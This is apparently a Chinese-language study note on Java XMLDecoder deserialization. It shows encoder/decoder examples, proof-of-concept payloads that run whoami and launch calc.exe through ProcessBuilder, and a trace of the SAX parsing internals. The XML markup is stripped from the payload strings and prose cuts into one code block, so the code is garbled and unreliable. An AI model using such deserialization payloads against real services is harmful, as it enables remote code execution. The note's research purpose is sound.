XMLDecoder反序列化
XMLEncode序列化
package com.example;
import java.io.IOException;
import java.util.ArrayList;
import java.util.HashMap;
public class XMLEncoder {
    public static void main(String[] args) throws IOException {
        HashMap hashMap = new HashMap<>();
        ArrayList arrayList = new ArrayList<>();
        arrayList.add("test");
        arrayList.add("demo");
        Process exec = Runtime.getRuntime().exec(new String[]{"cmd.exe", "/c", 
"whoami"});
        //Process exec = new ProcessBuilder("cmd.exe","/c","whoami").start();
        hashMap.put("123","456");
        hashMap.put("678",arrayList);
        hashMap.put("runtime",exec);
        java.beans.XMLEncoder xmlEncoder = new 
java.beans.XMLEncoder(System.out);
        xmlEncoder.writeObject(hashMap);
        xmlEncoder.close();
    }
}
/*
java.lang.InstantiationException: java.lang.ProcessImpl
Continuing ...
java.lang.RuntimeException: failed to evaluate: =Class.new();
Continuing ...
   123
   456
   678
     test
     demo
一开始想直接序列化一个 Runtime 对象，后来发现这个对象不能被 Encoder ，转而通过调用底层
的 ProcessBuilder 对象进行 Encoder ，发现还是会报错，原因是最底层的
java.lang.ProcessImpl 没办法通过创建一个对象。所有最后只能通过 Encoder 的数据格式来
构造反序列化的 payload 。
XMLDecode 反序列化
*/
package com.example;
import java.io.IOException;
import java.io.InputStream;
import java.io.StringBufferInputStream;
import java.nio.charset.StandardCharsets;
import java.util.HashMap;
public class XMLDecoder {
    public static void main(String[] args) {
        String encode= "\n" +
                "\n" 
+
                " \n" +
                "  \n" +
                "   123\n" +
                "   456\n" +
                "  \n" +
                "  \n" +
                "   678\n" +
                "   \n" +
                "    \n" +
                "     test\n" +
                "    \n" +
                "    \n" +
                "     demo\n" +
                "    \n" +
                "   \n" +
                "  \n" +
                " \n" +
                "\n" +
                "\n" +
                "Process finished with exit code 0\n";
        java.beans.XMLDecoder xmlDecoder = new java.beans.XMLDecoder(new 
StringBufferInputStream(encode));
        Object o = xmlDecoder.readObject();
        HashMap hashMap= (HashMap) o;
        Object o1 = ((HashMap) o).get("123");
        System.out.println(o1);
    }
}
/*
org.xml.sax.SAXParseException; lineNumber: 22; columnNumber: 1; 尾随节中不允许有内
容。
Continuing ...
456
*/
反序列化漏洞
看网上的文章执行命令都是用的 ProcessBuilder 类，所以我想先构造一下 Runtime 类能否执行
命令。
这个 payload 不一定是正确的。直接报错，原因应该是 Runtime 类的构造方法是私有类。接下来
换成 ProcessBuilder 类
package com.example;
import java.beans.XMLDecoder;
import java.io.StringBufferInputStream;
public class XMLDecodeBug {
    public static void main(String[] args) {
        String encode= "\n" +
                "\n" 
+
                " \n" +
                "  \n" +
                "   whoami\n" +
                "  \n" +
                " \n" +
                "";
        XMLDecoder xmlDecoder = new XMLDecoder(new 
StringBufferInputStream(encode));
        Object o = xmlDecoder.readObject();
    }
}
/*
java.lang.IllegalAccessException: Class sun.reflect.misc.Trampoline can not 
access a member of class java.lang.Runtime with modifiers "private"
Continuing ...
java.lang.IllegalStateException: The outer element does not return value
Continuing ...
java.lang.IllegalStateException: The outer element does not return value
Continuing ...
Exception in thread "main" java.lang.ArrayIndexOutOfBoundsException: 0
    at java.beans.XMLDecoder.readObject(XMLDecoder.java:250)
    at com.example.XMLDecodeBug.main(XMLDecodeBug.java:19)
*/
package com.example;
import java.beans.XMLDecoder;
import java.io.StringBufferInputStream;
public class XMLDecodeBug {
    public static void main(String[] args) {
        String encode= "\n" +
                "\n" 
+
                " \n" +
                " \n" +
                "    \n" +
                "     cmd.exe\n" +
过程跟踪
参考文章
XMLDecoder 的整体解析过程是基于 java 自带的 SAX XML 解析进行的。 SAX 是一种 XML 解析的替
代方法。相比于 DOM ， SAX 是一种速度更快，更有效的方法。它逐行扫描文档，一边扫描一边解
析。而且相比于 DOM ， SAX 可以在解析文档的任意时刻停止解析，但任何事物都有其相反的一
面，对于 SAX 来说就是操作复杂。
DocumnetHandler 继承自 DefaultHandler ， DefaultHandler 是使用 SAX 进行XML解析的默
认 Handler 。 DefaultHandler 实现了四个接口，而 DocumentHandler 主要是改写了
ContentHandle 中的几个接口，毕竟主要。
                "    \n" +
                "    \n" +
                "     /c\n" +
                "    \n" +
                "    \n" +
                "     calc.exe\n" +
                "    \n" +
                "   \n" +
                "  \n" +
                "  \n" +
                " \n" +
                "";
        XMLDecoder xmlDecoder = new XMLDecoder(new 
StringBufferInputStream(encode));
        Object o = xmlDecoder.readObject();
    }
}
//弹出计算机
在 DocumentHandler 初始化的过程中，会根据不同的标签，填充不同的标签处理 handler ，这
些 Handler 全都实现或继承 ElementHandler ，也就是说 XMLDecoder 只能解析如下这些标签。
ValueObject  是一个包装类接口，包裹了实际解析过程中产生的对象，包括 null 。一般的对象
由 ValueObjectImpl 进行包裹，而 null\true\false （非 boolean 标签）则直接由自身
Handler 进行代表，实现相关接口。
XMLDecoder 初始化
readObject()->parsingComplete()
private boolean parsingComplete() {
        if (this.input == null) {  //input存储将要被反序列化的数据
            return false;
        }
        if (this.array == null) {
            if ((this.acc == null) && (null != System.getSecurityManager())) {
            //this.acc是一个安全校验的东西
                throw new SecurityException("AccessControlContext is not set");
            }
            AccessController.doPrivileged(new PrivilegedAction() {
                public Void run() {